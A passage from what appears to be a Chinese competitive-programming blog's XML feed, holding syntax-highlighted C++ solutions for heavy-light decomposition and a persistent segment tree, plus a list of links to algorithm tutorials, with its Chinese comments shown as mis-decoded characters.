class="keyword">if</span>(L&lt;=mid)<span class="built_in">update</span>(lson,L,R,k);</span><br><span class="line">        <span class="keyword">if</span>(R&gt;mid)<span class="built_in">update</span>(rson,L,R,k);</span><br><span class="line">        a[rt]=(a[rt&lt;&lt;<span class="number">1</span>]+a[rt&lt;&lt;<span class="number">1</span>|<span class="number">1</span>])%mod;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//---------------------------------ä»¥ä¸Šä¸ºçº¿æ®µæ ‘ </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">qRange</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(top[x]!=top[y]) &#123;<span class="comment">//å½“ä¸¤ä¸ªç‚¹ä¸åœ¨åŒä¸€æ¡é“¾ä¸Š </span></span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class="line">        <span class="built_in">swap</span>(x,y);<span class="comment">//æŠŠxç‚¹æ”¹ä¸ºæ‰€åœ¨é“¾é¡¶ç«¯çš„æ·±åº¦æ›´æ·±çš„é‚£ä¸ªç‚¹</span></span><br><span class="line">        res=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[top[x]],id[x]);<span class="comment">//ansåŠ ä¸Šxç‚¹åˆ°xæ‰€åœ¨é“¾é¡¶ç«¯ è¿™ä¸€æ®µåŒºé—´çš„ç‚¹æƒå’Œ</span></span><br><span class="line">        ans+=res;</span><br><span class="line">        ans%=mod;<span class="comment">//æŒ‰é¢˜æ„å–æ¨¡ </span></span><br><span class="line">        x=fa[top[x]];<span class="comment">//æŠŠxè·³åˆ°xæ‰€åœ¨é“¾é¡¶ç«¯çš„é‚£ä¸ªç‚¹çš„ä¸Šé¢ä¸€ä¸ªç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//ç›´åˆ°ä¸¤ä¸ªç‚¹å¤„äºä¸€æ¡é“¾ä¸Š</span></span><br><span class="line">    <span class="keyword">if</span>(dep[x]&gt;dep[y])<span class="built_in">swap</span>(x,y);<span class="comment">//æŠŠxç‚¹æ·±åº¦æ›´æ·±çš„é‚£ä¸ªç‚¹</span></span><br><span class="line">    res=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[y]);<span class="comment">//è¿™æ—¶å†åŠ ä¸Šæ­¤æ—¶ä¸¤ä¸ªç‚¹çš„åŒºé—´å’Œå³å¯</span></span><br><span class="line">    ans+=res;</span><br><span class="line">    <span class="keyword">return</span> ans%mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">updRange</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> k)</span> <span class="comment">//åŒä¸Š</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    k%=mod;</span><br><span class="line">    <span class="keyword">while</span>(top[x]!=top[y])&#123;</span><br><span class="line">        <span class="keyword">if</span>(dep[top[x]]&lt;dep[top[y]])</span><br><span class="line">        <span class="built_in">swap</span>(x,y);</span><br><span class="line">        <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[top[x]],id[x],k);</span><br><span class="line">        x=fa[top[x]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(dep[x]&gt;dep[y])<span class="built_in">swap</span>(x,y);</span><br><span class="line">    <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[y],k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">qSon</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    res=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">query</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[x]+siz[x]<span class="number">-1</span>);<span class="comment">//å­æ ‘åŒºé—´å³ç«¯ç‚¹ä¸ºid[x]+siz[x]-1 </span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">updSon</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> k)</span> <span class="comment">//åŒä¸Š</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">update</span>(<span class="number">1</span>,<span class="number">1</span>,n,id[x],id[x]+siz[x]<span class="number">-1</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> f,<span class="type">int</span> deep)</span> <span class="comment">//xå½“å‰èŠ‚ç‚¹ï¼Œfçˆ¶äº²ï¼Œdeepæ·±åº¦ </span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    dep[x]=deep;<span class="comment">//æ ‡è®°æ¯ä¸ªç‚¹çš„æ·±åº¦ </span></span><br><span class="line">    fa[x]=f;<span class="comment">//æ ‡è®°æ¯ä¸ªç‚¹çš„çˆ¶äº² </span></span><br><span class="line">    siz[x]=<span class="number">1</span>;<span class="comment">//æ ‡è®°æ¯ä¸ªéå¶å­èŠ‚ç‚¹çš„å­æ ‘å¤§å° </span></span><br><span class="line">    <span class="type">int</span> maxson=<span class="number">-1</span>;<span class="comment">//è®°å½•é‡å„¿å­çš„å„¿å­æ•° </span></span><br><span class="line">    <span class="keyword">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class="line">        <span class="type">int</span> y=to[i];</span><br><span class="line">        <span class="keyword">if</span>(y==f)</span><br><span class="line">        <span class="keyword">continue</span>;<span class="comment">//è‹¥ä¸ºçˆ¶äº²åˆ™continue </span></span><br><span class="line">        <span class="built_in">dfs1</span>(y,x,deep+<span class="number">1</span>);<span class="comment">//dfså…¶å„¿å­ </span></span><br><span class="line">        siz[x]+=siz[y];<span class="comment">//æŠŠå®ƒçš„å„¿å­æ•°åŠ åˆ°å®ƒèº«ä¸Š </span></span><br><span class="line">        <span class="keyword">if</span>(siz[y]&gt;maxson)son[x]=y,maxson=siz[y];<span class="comment">//æ ‡è®°æ¯ä¸ªéå¶å­èŠ‚ç‚¹çš„é‡å„¿å­ç¼–å· </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> topf)</span> <span class="comment">//xå½“å‰èŠ‚ç‚¹ï¼Œtopfå½“å‰é“¾çš„æœ€é¡¶ç«¯çš„èŠ‚ç‚¹ </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    id[x]=++cnt;<span class="comment">//æ ‡è®°æ¯ä¸ªç‚¹çš„æ–°ç¼–å· </span></span><br><span class="line">    wt[cnt]=w[x];<span class="comment">//æŠŠæ¯ä¸ªç‚¹çš„åˆå§‹å€¼èµ‹åˆ°æ–°ç¼–å·ä¸Šæ¥ </span></span><br><span class="line">    top[x]=topf;<span class="comment">//è¿™ä¸ªç‚¹æ‰€åœ¨é“¾çš„é¡¶ç«¯ </span></span><br><span class="line">    <span class="keyword">if</span>(!son[x])</span><br><span class="line">    <span class="keyword">return</span>;<span class="comment">//å¦‚æœæ²¡æœ‰å„¿å­åˆ™è¿”å› </span></span><br><span class="line">    <span class="built_in">dfs2</span>(son[x],topf);<span class="comment">//æŒ‰å…ˆå¤„ç†é‡å„¿å­ï¼Œå†å¤„ç†è½»å„¿å­çš„é¡ºåºé€’å½’å¤„ç† </span></span><br><span class="line">    <span class="keyword">for</span>(Rint i=beg[x];i;i=nex[i]) &#123;</span><br><span class="line">        <span class="type">int</span> y=to[i];</span><br><span class="line">        <span class="keyword">if</span>(y==fa[x]||y==son[x])<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs2</span>(y,y);<span class="comment">//å¯¹äºæ¯ä¸€ä¸ªè½»å„¿å­éƒ½æœ‰ä¸€æ¡ä»å®ƒè‡ªå·±å¼€å§‹çš„é“¾ </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(n);</span><br><span class="line">    <span class="built_in">read</span>(m);</span><br><span class="line">    <span class="built_in">read</span>(r);</span><br><span class="line">    <span class="built_in">read</span>(mod);</span><br><span class="line">    <span class="keyword">for</span>(Rint i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">read</span>(w[i]);</span><br><span class="line">    <span class="keyword">for</span>(Rint i=<span class="number">1</span>;i&lt;n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">read</span>(a);<span class="built_in">read</span>(b);</span><br><span class="line">        <span class="built_in">add</span>(a,b);<span class="built_in">add</span>(b,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">dfs1</span>(r,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">dfs2</span>(r,r);</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">while</span>(m--) &#123;</span><br><span class="line">        <span class="type">int</span> k,x,y,z;</span><br><span class="line">        <span class="built_in">read</span>(k);</span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);<span class="built_in">read</span>(z);</span><br><span class="line">            <span class="built_in">updRange</span>(x,y,z);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">qRange</span>(x,y));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(k==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);<span class="built_in">read</span>(y);</span><br><span class="line">            <span class="built_in">updSon</span>(x,y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">read</span>(x);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">qSon</span>(x));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°é“¾å‰–åˆ† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†</title>
      <link href="/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/"/>
      <url>/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><a href="//blog.csdn.net/zearot/article/details/48299459">çº¿æ®µæ ‘è¯¦è§£ ï¼ˆåŸç†ï¼Œå®ç°ä¸åº”ç”¨ï¼‰</a><br><a href="//blog.csdn.net/lyd_7_29/article/details/51405469">å¯æŒä¹…åŒ–çº¿æ®µæ ‘ ç®€ä»‹</a>  </p><p><a href="//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf">è¿ç”¨ä¼¸å±•æ ‘è§£å†³æ•°åˆ—ç»´æŠ¤é—®é¢˜.pdf</a><br><a href="//oi.men.ci/splay-notes-1/">Splay å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰</a><br><a href="//oi.men.ci/splay-notes-2/">Splay å­¦ä¹ ç¬”è®°ï¼ˆäºŒï¼‰</a><br><a href="//oi.men.ci/splay-notes-3/">Splay å­¦ä¹ ç¬”è®°ï¼ˆä¸‰ï¼‰</a>   </p><p><a href="//lib.csdn.net/article/datastructure/9204">è¯·è¦ç›¸ä¿¡æˆ‘ï¼Œ30åˆ†é’Ÿè®©ä½ æŒæ¡AVLæ ‘ï¼ˆå¹³è¡¡äºŒå‰æ ‘ï¼‰</a><br><a href="//blog.csdn.net/sun_tttt/article/details/65445754">æœ€å®¹æ˜“æ‡‚çš„çº¢é»‘æ ‘</a><br><a href="//www.cnblogs.com/Mathics/p/3971220.html">ä¸‰å¤§å¹³è¡¡æ ‘ï¼ˆTreap + Splay + SBTï¼‰æ€»ç»“+æ¨¡æ¿</a><br><a href="//oi.men.ci/link-cut-tree-notes/">Link-Cut Tree å­¦ä¹ ç¬”è®°</a><br><a href="//files.cnblogs.com/files/yyy2015c01/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6.pdf">å¯æŒä¹…åŒ–æ•°æ®ç»“æ„ç ”ç©¶.pdf</a>  </p><p><a href="//www.cnblogs.com/dalt/p/8206664.html">æ ‘é“¾å‰–åˆ†è¯¦è§£</a><br><a href="//www.cnblogs.com/chinhhh/p/7965433.html">æ ‘é“¾å‰–åˆ†è¯¦è§£ï¼ˆæ´›è°·æ¨¡æ¿ P3384ï¼‰</a>  </p><p><a href="//blog.csdn.net/PomeCat/article/details/72832494">åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰ä¼˜åŒ–ä¹‹æ–œç‡ä¼˜åŒ–è®²è§£</a><br><a href="//www.cnblogs.com/MashiroSky/p/6009685.html">æ–œç‡ä¼˜åŒ–å­¦ä¹ ç¬”è®°</a><br><a href="//www.cnblogs.com/mlystdcall/p/6525962.html">å››è¾¹å½¢ä¸ç­‰å¼å­¦ä¹ ç¬”è®°</a><br><a href="//www.yhzq-blog.cc/%E6%8F%92%E5%A4%B4dp-%E4%BB%8E%E4%B8%8D%E4%BC%9A%E5%88%B0%E5%B4%A9%E6%BA%83/">æ’å¤´dpå…¥é—¨</a>  </p><p><a href="//segmentfault.com/a/1190000003914228">æœ€é•¿å›æ–‡å­ä¸²â€”â€”Manacher ç®—æ³•ï¼ˆäººç§°â€œé©¬æ‹‰è½¦ç®—æ³•â€ï¼‰</a>  </p><p><a href="//www.cnblogs.com/mlystdcall/p/6734852.html">ä¸Šä¸‹ç•Œç½‘ç»œæµå»ºæ¨¡æ–¹æ³•æ€»ç»“</a>   </p><p><a href="//www.gatevin.moe/acm/fft%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">FFTç®—æ³•å­¦ä¹ ç¬”è®°</a><br><a href="//www.cnblogs.com/tmzbot/p/4668158.html">Fast Walsh-Hadamard Transformï¼ˆå¿«é€Ÿæ²ƒå°”ä»€å˜æ¢ï¼‰</a>  </p><p><a href="//www.cnblogs.com/mlystdcall/p/6219421.html">ç®€æ˜“CDQåˆ†æ²»æ•™ç¨‹&amp;å­¦ä¹ ç¬”è®°</a><br><a href="//www.cnblogs.com/mlystdcall/p/6232324.html">å››ç»´ååº(CDQå¥—CDQ)</a></p>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ´›è°·:P3919 ã€æ¨¡æ¿ã€‘å¯æŒä¹…åŒ–æ•°ç»„ï¼ˆå¯æŒä¹…åŒ–çº¿æ®µæ ‘/å¹³è¡¡æ ‘ï¼‰</title>
      <link href="/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/"/>
      <url>/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>åŸé¢˜åœ°å€:<a href="//www.luogu.org/problemnew/show/P3919">https://www.luogu.org/problemnew/show/P3919</a></p><h3 id="é¢˜ç›®ç®€è¿°"><a href="#é¢˜ç›®ç®€è¿°" class="headerlink" title="é¢˜ç›®ç®€è¿°"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»´æŠ¤ä¸€ä¸ªé•¿åº¦ä¸ºNçš„æ•°ç»„ï¼Œæ”¯æŒå¦‚ä¸‹å‡ ç§æ“ä½œï¼š  </p><ol><li>åœ¨æŸä¸ªå†å²ç‰ˆæœ¬ä¸Šä¿®æ”¹æŸä¸€ä¸ªä½ç½®ä¸Šçš„å€¼  </li><li>è®¿é—®æŸä¸ªå†å²ç‰ˆæœ¬ä¸Šçš„æŸä¸€ä½ç½®çš„å€¼<br>æ­¤å¤–ï¼Œæ¯è¿›è¡Œä¸€æ¬¡æ“ä½œï¼ˆå¯¹äºæ“ä½œ2ï¼Œå³ä¸ºç”Ÿæˆä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„ç‰ˆæœ¬ï¼Œä¸ä½œä»»ä½•æ”¹åŠ¨ï¼‰ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ã€‚ç‰ˆæœ¬ç¼–å·å³ä¸ºå½“å‰æ“ä½œçš„ç¼–å·ï¼ˆä»1å¼€å§‹ç¼–å·ï¼Œç‰ˆæœ¬0è¡¨ç¤ºåˆå§‹çŠ¶æ€æ•°ç»„ï¼‰</li></ol><hr><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>é¦–å…ˆæ„Ÿè°¢æ¥è‡ª<a href="https://www.luogu.org/space/show?uid=2978">@zcysky</a>çš„æ¨¡æ¿ã€‚å†™çš„éå¸¸æ¼‚äº®ï¼Œå°è£…ä¹Ÿå¾ˆç²¾è‡´ã€‚<br>è¿™é¢˜æ˜¯è£¸é¢˜ï¼Œäºæ˜¯ç›´æ¥ä¸Šæ¨¡æ¿å°±è¡Œäº†ã€‚æ³¨æ„æ­¤é¢˜è¾“å…¥æ•°æ®å¤§ï¼Œéœ€è¦è¯»å…¥ä¼˜åŒ–ã€‚<br>å…³äºå¯æŒä¹…åŒ–çº¿æ®µæ ‘çš„ä»‹ç»ä¸æ€»ç»“ï¼Œä¹‹åæŠŠå‘å¡«ä¸Šã€‚  </p><hr><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1000005</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a[N],n,q,rt[N*<span class="number">20</span>];<span class="comment">//ç©ºé—´å¤æ‚åº¦O(mlogn) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXB 50000000</span></span><br><span class="line"><span class="type">char</span> buf[MAXB],*cp=buf;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*cp&lt;<span class="string">&#x27;0&#x27;</span>||*cp&gt;<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cp==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(*cp&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+*cp-<span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Persistable_Segment_Tree</span> &#123;</span><br><span class="line">    <span class="type">int</span> lc[N*<span class="number">20</span>],rc[N*<span class="number">20</span>],val[N*<span class="number">20</span>],cnt;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> &amp;o,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        o=++cnt;</span><br><span class="line">        <span class="keyword">if</span>(l==r) &#123;</span><br><span class="line">            val[o]=a[l];</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(lc[o],l,mid);</span><br><span class="line">        <span class="built_in">build</span>(rc[o],mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> &amp;o,<span class="type">int</span> pre,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> q,<span class="type">int</span> v)</span></span>&#123;</span><br><span class="line">        o=++cnt;</span><br><span class="line">        lc[o]=lc[pre];</span><br><span class="line">        rc[o]=rc[pre];</span><br><span class="line">        val[o]=val[pre];</span><br><span class="line">        <span class="keyword">if</span>(l==r) &#123;</span><br><span class="line">            val[o]=v;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(q&lt;=mid)</span><br><span class="line">            <span class="built_in">ins</span>(lc[o],lc[pre],l,mid,q,v);</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">ins</span>(rc[o],rc[pre],mid+<span class="number">1</span>,r,q,v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> o,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> q)</span></span>&#123;<span class="comment">//ç±»ä¼¼äºŒåˆ†çš„æŸ¥è¯¢ </span></span><br><span class="line">        <span class="keyword">if</span>(l==r)</span><br><span class="line">            <span class="keyword">return</span> val[o];</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(q&lt;=mid)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(lc[o],l,mid,q);</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(rc[o],mid+<span class="number">1</span>,r,q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;T;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fread</span>(buf,<span class="number">1</span>,MAXB,stdin);</span><br><span class="line">    n=<span class="built_in">read</span>();</span><br><span class="line">    <span class="type">int</span> m=<span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        a[i]=<span class="built_in">read</span>();</span><br><span class="line">    T.<span class="built_in">build</span>(rt[<span class="number">0</span>],<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> pre=<span class="built_in">read</span>(),opt=<span class="built_in">read</span>(),x=<span class="built_in">read</span>();</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">1</span>) &#123;<span class="comment">//æ“ä½œ1:åœ¨ç‰ˆæœ¬preçš„åŸºç¡€ä¸Šå°†ç¬¬xä¸ªæ•°ä¿®æ”¹ä¸ºv </span></span><br><span class="line">            <span class="type">int</span> v=<span class="built_in">read</span>();</span><br><span class="line">            T.<span class="built_in">ins</span>(rt[i],rt[pre],<span class="number">1</span>,n,x,v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">2</span>) &#123;<span class="comment">//æ“ä½œ2:è®¿é—®ç‰ˆæœ¬preä¸­ç¬¬xä¸ªæ•°çš„å€¼ </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,T.<span class="built_in">query</span>(rt[pre],<span class="number">1</span>,n,x));</span><br><span class="line">            rt[i]=rt[pre];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŒä¹…åŒ– </tag>
            
            <tag> çº¿æ®µæ ‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OIä¸­çš„IOä¼˜åŒ–</title>
      <link href="/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/"/>
      <url>/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/</url>
      
